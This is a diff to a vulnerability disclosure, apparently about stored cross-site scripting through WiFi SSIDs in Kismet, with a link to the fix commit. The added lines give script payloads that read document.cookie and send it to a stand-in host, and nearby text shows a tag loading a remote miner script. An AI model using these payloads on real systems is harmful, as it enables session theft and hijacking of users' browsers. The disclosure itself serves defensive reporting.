@@ -22,6 +22,10 @@ WIFI SSID example:
 ![](screenshots/WIFI_SSID_20250327_101926.png)
 ![](screenshots/WIFI_XSS_20250327102242.png)
 
+
+Cookie can be extracted via: `<script>alert(document.cookie)</script>` or `<script>location='http://example.com/?c='+document.cookie;</script>`
+![](screenshots/cookie_xss_20250327063902.png)
+
 I don't think its super useful? But it's enough characters to load a remote script. eg: `<script src=//example.com/bitcoinminer.js>`
 
 Fixed: https://github.com/kismetwireless/kismet/commit/9d0821fc90fc5fa3b0dcc9000da49bacdea433ea
